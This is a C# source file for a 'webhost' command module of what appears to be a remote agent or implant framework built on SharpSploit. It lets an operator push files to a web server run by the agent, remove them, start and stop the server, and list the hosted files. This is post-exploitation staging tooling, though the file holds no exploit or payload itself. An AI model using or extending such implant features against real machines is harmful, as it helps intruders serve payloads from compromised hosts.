using Agent.Commands.Services;
using Agent.Communication;
using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Agent.Service.RunningService;

namespace Agent.Commands
{
    public class WebHostCommand : ServiceCommand<IWebHostService>
    {
        public override string Name => "webhost";

        public WebHostCommand()
        {
            base.Register("push", this.Push);
            base.Register("rm", this.Remove);
        }

        protected void Remove(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (args.Length == 0)
            {
                this.Service.Files.Clear();
                context.Result.Result = $"Files removed from the WebHost!";
            }
            else
            {
                string fileName = args[0].ToLower();
                if (this.Service.Files.ContainsKey(fileName))
                {
                    this.Service.Files.Remove(fileName);
                    context.Result.Result = $"File {fileName} removed from the WebHost!";
                }
                else
                {
                    context.Result.Result = $"File {fileName} is not hosted on the WebHost!";
                }
            }
        }

        protected void Push(AgentTask task, AgentCommandContext context, string[] args)
        {
            this.CheckFileDownloaded(task, context);
            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            this.AddFile(file.Name, file.GetFileContent());
            context.Result.Result = $"File {file.Name} stored on the WebHost!";
        }

        private void AddFile(string fileName, byte[] fileContent)
        {
            fileName = fileName.ToLower();
            if (this.Service.Files.ContainsKey(fileName))
                this.Service.Files[fileName] = fileContent;
            else
                this.Service.Files.Add(fileName, fileContent);
        }
        protected override void Start(AgentTask task, AgentCommandContext context, string[] args)
        {
            var url = args[0].ToLower();
            var conn = ConnexionUrl.FromString(url);
            if (!conn.IsValid)
            {
                context.Result.Result = $"WebHost binding is not valid !";
                return;
            }

            if (this.Service.Status == RunningService.RunningStatus.Running)
            {
                context.Result.Result = "WebHost is already running!";
                return;
            }

            this.Service.Start(conn);
            context.Result.Result = $"WebHost started";
        }

        protected override void Stop(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (this.Service.Status != RunningService.RunningStatus.Running)
            {
                context.Result.Result = "WebHost is not running!";
                return;
            }

            this.Service.Stop();
            context.Result.Result = $"WebHost stopped";
        }

        protected override void Show(AgentTask task, AgentCommandContext context, string[] args)
        {
            if (this.Service.Status != RunningService.RunningStatus.Running)
                context.Result.Result = "WebHost is stopped!" + Environment.NewLine;
            else
                context.Result.Result = "WebHost is running!" + Environment.NewLine;

            var list = new SharpSploitResultList<ListWebHostFileResult>();
            foreach (var file in this.Service.Files.Keys)
            {
                list.Add(new ListWebHostFileResult()
                {
                    File = file
                });

            }
            context.Result.Result += list.ToString();

        }

        public sealed class ListWebHostFileResult : SharpSploitResult
        {

            public string File { get; set; }

            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(File), Value = File },
            };
        }
    }
}
